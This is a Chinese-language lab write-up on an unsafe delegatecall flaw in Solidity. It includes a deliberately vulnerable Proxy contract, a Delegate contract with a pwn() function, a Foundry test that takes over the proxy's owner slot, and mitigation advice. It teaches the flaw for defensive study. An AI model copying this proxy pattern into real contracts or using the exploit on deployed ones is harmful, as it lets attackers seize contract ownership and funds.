# 不安全委托调用
[Delegatecall.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Delegatecall.sol)  

**名称：** 不安全委托调用漏洞  

**描述：**  
Proxy合约中的变量owner被操控漏洞是智能合约设计中的缺陷，这种缺陷允许攻击者操纵Proxy合约的owner，并且onwer被硬编码为0xdeadbeef。  
这个漏洞的产生是由于在Proxy合约的fallback函数中使用了delegatecall。   
delegatecall允许攻击者在Proxy合约上下文中，调用Delegate合约中的pwn()函数，从而改变Proxy合约状态变量owner的值。  
这允许智能合约在运行时，从不同的地址动态加载代码。  

**场景：**  
Proxy合约是为了帮助用户调用逻辑合约而设计的。
Proxy合约的owner被硬编码为0xdeadbeef。  
你可以操纵代理合约的owner吗？  

**解决方法：**  
为了缓解Proxy合约所有者被操纵漏洞，除非明确需求使用 delegatecall，否则尽量不要使用。即使要使用时也要确保使用delegatecall的安全性。  
如果对于合约的功能而言委托调用是必要的，务必验证和清理输入，以避免出现意外行为。  


**Proxy 合约：**  
```solidity
contract Proxy {
    address public owner = address(0xdeadbeef); // slot0
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc, ) = address(delegate).delegatecall(msg.data); // 漏洞
        require(suc, "Delegatecall failed");
    }
}
```


**如何测试：**  

`forge test --contracts src/test/Delegatecall.sol -vvvv` 

```solidity
// 测试使用delegatecall场景的函数
function testDelegatecall() public {
    // 初始化一个新的委托合约，即“逻辑合约”。
    DelegateContract = new Delegate(); 
    // 初始化一个新的代理合约，将委托合约的地址传递给构造函数。这就是“代理合约”。
    proxy = new Proxy(address(DelegateContract)); 

    // 记录Alice的地址。
    console.log("Alice address", alice);
    // 记录代理合约的所有者。
    console.log("DelegationContract owner", proxy.owner());

    // 记录更改代理合约所有者操作的开始
    console.log("Change DelegationContract owner to Alice...");
    // 将msg.sender设置为Alice。
    vm.prank(alice);
    // 通过delegatecall 调用Delegate合约的pwn函数.这就是漏洞。
    address(proxy).call(abi.encodeWithSignature("pwn()")); 
    // Proxy.fallback()将委托调用Delegate.pwn(), 使得Alice成为代理合约的所有者。

    // 记录代理合约的新所有者。
    console.log("DelegationContract owner", proxy.owner());
    // 记录漏洞攻击完成。
    console.log(
        "Exploit completed, proxy contract storage has been manipulated"
    );
}

// Delegate 合约, 包含了可以通过delegatecall调用的代码。
contract Delegate {
    // 合约的所有者。
    address public owner; // slot0

    // pwn 函数, 将合约的所有者设置为消息发送者。
    function pwn() public {
        owner = msg.sender;
    }
}
```
**红框：** 攻击成功，owner已经更改
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3d7b2665-e934-4b5a-b9ec-1302656f7da8%2FUntitled.png?table=block&id=6be82235-a425-44a7-9174-c6bfb0e027ec&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)
